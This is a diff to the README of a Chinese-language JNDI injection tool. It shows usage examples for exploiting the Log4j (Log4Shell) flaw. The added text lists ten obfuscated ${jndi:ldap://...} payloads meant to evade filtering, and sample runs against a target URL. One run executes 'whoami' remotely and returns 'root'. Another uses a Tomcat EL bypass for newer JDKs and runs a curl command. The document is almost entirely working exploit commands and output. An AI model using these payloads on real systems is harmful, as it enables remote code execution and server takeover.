@@ -26,23 +26,51 @@ java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j 127.0.0.1 80 "whoami" http://target
 java -cp jndi_tool.jar jndi.log4j.HLDAPLog4jAuto 127.0.0.1 1099 url=http://xxx
 java -cp jndi_tool.jar jndi.log4j.Tamper "${jndi:ldap://127.0.0.1/a}" all=true random=true
 
-
+# 2021-12-24 优化了细节
 # 2021-12-18 优化了细节
 
+
 1. 新增LOG4J相关检测
-> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/
-[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
-[-] LDAP Listening on 0.0.0.0:80
+> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 8088 "whoami" http://xx.xx.xx:8080/
+[-] LDAP Listening on 0.0.0.0:8088
+0. ${jndi:ldap://127.0.0.1:8088/xobject}
+1. ${jndi:ldap://127.0.0.1#127.0.0.1:8088/xobject}
+2. ${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://127.0.0.1:8088/xobject}
+3. ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1:8088/xobject}
+4. ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:8088/xobject}
+5. ${${kXqh:pJ:-j}${FAvg:PfJU:-n}${DMCK:qO:-d}${::-i}:${z:Aq:-l}${:XT:-d}${cFEq::-a}${DfP:dpH:-p}://127.0.0.1:8088/xobject}
+6. ${${RkL:kdx:x:Ta:vT:zMy:-j}${:CFf:yI:-n}${:CR:LqeF::-d}${EY:LgWR:Y:lao:-i}:${Y:D:-l}${HSh:lK:C:-d}${UIyH:ppxT:-a}${cNi:gxB:z:-p}://127.0.0.1:8088/xobject}
+7. ${${lower:${lower:j}}${lower:${lower:${lower:n}}}${lower:${lower:d}}${lower:${lower:i}}:${lower:l}${lower:${lower:${lower:${lower:d}}}}${lower:${lower:${lower:a}}}${lower:${lower:p}}://127.0.0.1:8088/xobject}
+8. ${${upper:${upper:j}}${upper:${upper:${upper:n}}}${upper:${upper:${upper:${upper:d}}}}${upper:${upper:i}}:${upper:${upper:l}}${upper:d}${upper:${upper:${upper:a}}}${upper:${upper:${upper:p}}}://127.0.0.1:8088/xobject}
+9. ${${upper:${upper:${upper:j}}}${upper:n}${lower:${upper:${lower:${lower:d}}}}${upper:${lower:${lower:i}}}:${upper:${lower:l}}${upper:${lower:d}}${lower:a}${lower:${upper:${lower:p}}}://127.0.0.1:8088/xobject}
+[-] please chosse payload, or input payload like payload=${......}
+> 0
+[-] payload: ${jndi:ldap://127.0.0.1:8088/xobject}
+[-] start exploit. waiting...
 [-] remote target jdk version: java/1.8.0_131, use payload version: jdk8
 [-] send payload done
 [-] waiting result...
 result: 
 root
 
-> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 80 "whoami" http://xx.xx.xx:8080/ w=tomcat  // 高版本jdk的绕过，依赖el
-[-] payload:  ${jndi:ldap://xx.xx.xx.xx/x}
-[-] LDAP Listening on 0.0.0.0:80
-[-] start exploit.
+
+
+> java -cp jndi_tool.jar jndi.log4j.HLDAPLog4j xx.xx.xx.xx 8088 "whoami" http://xx.xx.xx:8080/ w=tomcat  // 高版本jdk的绕过，依赖el
+[-] LDAP Listening on 0.0.0.0:8088
+0. ${jndi:ldap://127.0.0.1:8088/xobject}
+1. ${jndi:ldap://127.0.0.1#127.0.0.1:8088/xobject}
+2. ${${upper:j}${upper:n}${upper:d}${upper:i}:${upper:l}${upper:d}${upper:a}${upper:p}://127.0.0.1:8088/xobject}
+3. ${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1:8088/xobject}
+4. ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:8088/xobject}
+5. ${${kXqh:pJ:-j}${FAvg:PfJU:-n}${DMCK:qO:-d}${::-i}:${z:Aq:-l}${:XT:-d}${cFEq::-a}${DfP:dpH:-p}://127.0.0.1:8088/xobject}
+6. ${${RkL:kdx:x:Ta:vT:zMy:-j}${:CFf:yI:-n}${:CR:LqeF::-d}${EY:LgWR:Y:lao:-i}:${Y:D:-l}${HSh:lK:C:-d}${UIyH:ppxT:-a}${cNi:gxB:z:-p}://127.0.0.1:8088/xobject}
+7. ${${lower:${lower:j}}${lower:${lower:${lower:n}}}${lower:${lower:d}}${lower:${lower:i}}:${lower:l}${lower:${lower:${lower:${lower:d}}}}${lower:${lower:${lower:a}}}${lower:${lower:p}}://127.0.0.1:8088/xobject}
+8. ${${upper:${upper:j}}${upper:${upper:${upper:n}}}${upper:${upper:${upper:${upper:d}}}}${upper:${upper:i}}:${upper:${upper:l}}${upper:d}${upper:${upper:${upper:a}}}${upper:${upper:${upper:p}}}://127.0.0.1:8088/xobject}
+9. ${${upper:${upper:${upper:j}}}${upper:n}${lower:${upper:${lower:${lower:d}}}}${upper:${lower:${lower:i}}}:${upper:${lower:l}}${upper:${lower:d}}${lower:a}${lower:${upper:${lower:p}}}://127.0.0.1:8088/xobject}
+[-] please chosse payload, or input payload like payload=${......}
+> 0
+[-] payload: ${jndi:ldap://127.0.0.1:8088/xobject}
+[-] start exploit. waiting...
 [-] input class: tomcat, command: curl xx.xx.xx
 [*] Send data...
 [-] exit.
